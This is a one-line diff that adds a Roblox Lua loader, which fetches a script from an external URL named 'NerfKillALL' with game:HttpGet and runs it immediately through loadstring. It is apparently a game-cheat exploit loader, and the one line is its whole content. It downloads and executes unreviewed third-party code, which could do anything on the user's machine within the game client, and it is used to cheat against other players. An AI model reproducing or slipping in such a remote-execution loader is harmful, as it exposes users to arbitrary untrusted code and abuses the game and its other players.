@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://short.dohmscripts.com/NerfKillALL'),true))()
